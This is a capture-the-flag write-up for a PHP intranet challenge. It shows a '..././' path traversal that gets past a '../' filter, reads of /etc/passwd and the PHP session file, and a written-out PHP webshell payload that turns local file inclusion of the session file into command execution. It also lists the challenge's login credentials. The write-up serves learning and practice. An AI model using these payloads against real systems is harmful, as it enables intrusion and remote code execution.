#### Vibed Intranet Part 2
- points earned: 482
#### Investigating the app
- I can log into the app with the credentials obtained in  `Vibed Intranet Part 1`.
	- username: `Andyrew`
	- password: `amkji2ho2hO#*EH*(@Hhshag`
- Once Logged in I see an app with a form that accepts a `MODT filename`
- Despite the terminology of 'MOTD Upload' it does not actually appear to be a file upload.
- When submitting the form a GET request is sent to `/preview.php?view=<filename>`.
- It appears that this will be an arbitrary file read

#### Investigating arbitrary file read
- Starting off with standard arbitrary file read enumeration I attempt `/preview.php?view=../../../../../../../../etc/passwd` which results in `Document not found.`
- So there is some sanitation or parsing of the filename provided so I'll need to do some testing to see if I can derive how it works.
	- I'll use `default.txt` as a control which returns `Welcome to the TJ Intranet. Please report any security vulnerabilities you find to staff!`.
	- `./default.txt`
		- This works but is not is not really a definitive indicator of anything.
	- `d../efault.txt`
		- This works which indicates that `../` is being removed from the filename string,
	- `d./efault.txt`
		- This does not work which means that `./` is not being removed
	- `d..././efault.txt`
		- This does not work which indicates that there is no recursive checking for `../`
		- This means that a `..././..././` style payload may work.
	- `..././..././..././..././..././etc/passwd`
		- this works which is a successful arbitrary file read
- I continue by checking for `flag.txt` in standard locations without any like.
- So what are the options moving forward?
	- `flag.txt` is somewhere but i missed it.
	- The flag is in some file somewhere that I haven't checked.
	- The file is being included into the app making this an officiaal file inclusion vulnerability.
		- If this is true and I can write to a file somewhere then I might be able to get code execution in the app.
- I spent a little bit of time trying to find the flag somewhere in an unknown file.  For example, looking at files like `proc/self/environ`.
- I also tried reading the app source.  For example, `portal.php`.
	- Here I ran into a new response: `This file type was blocked.`
	- After some testing it appears that there is a whitelist which includes `.txt`.
	- I spent a bit of time trying to find bypasses for this without any luck.
- I then decided to look into getting code execution through LFI.
	- Generally here, I would look into something like `/var/log/apache2/access.log` but the `.log` extension gets blocked.
	- But what about a php session file?
		- The app does issues a `PHPSESSID`. (though it does get issued in a weird way).
		- The `X-Powered-By: PHP/8.4.20` confirms that PHP is being used.
	- PHP stores its sessions in `/var/lib/php/sessions/sess_<PHPSESSID>`.  So I try using the filename `..././..././..././..././..././var/lib/php/sessions/sess_0f439ff9ed344f2f16374f793626a869` where `0f439ff9ed344f2f16374f793626a869` is my PHPSESSID.  I get the following result:
		```
		username|s:7:"Andyrew";token_expires_at|s:24:"2026-05-17T23:12:50.987Z";recent_views|a:6:{i:0;s:17:"d..././efault.txt";i:1;s:40:"..././..././..././..././..././etc/passwd";i:2;s:38:"..././..././..././..././..././flag.txt";i:3;s:16:"..././portal.php";i:4;s:64:"..././var/lib/php/sessions/sess_0f439ff9ed344f2f16374f793626a869";i:5;s:88:"..././..././..././..././..././var/lib/php/sessions/sess_0f439ff9ed344f2f16374f793626a869";}
		```
		- This is exactly what wanted to see.  The file contains past requests that I made.  That means I have some control oc the contents of that file.
		- So if the app app is using `include()` on the filename that I provide and that file contains PHP code then the code will get executed
	- After a couple of tries I was able to get working php webshell.

#### Solution
- Log into the application
	- username: `Andyrew`
	- password: `amkji2ho2hO#*EH*(@Hhshag`
- Send a request to get valid php for a webshell into the sessions file.
	```
	GET /preview.php?view=<?php+echo(system($_GET['c']))+?>
	```
- Send the following request to get command execution.
	```
	GET /preview.php?view=..././..././..././..././..././var/lib/php/sessions/sess_0f439ff9ed344f2f16374f793626a869&c=id
	```
- To find the actual flag
	- `ls /home/andrew`
		- shows `2283274892734342376.txt` in the home dir.  sus.
	- `cat /home/andrew/2283274892734342376.txt`
		- which shows that the contents of that text file contains the flag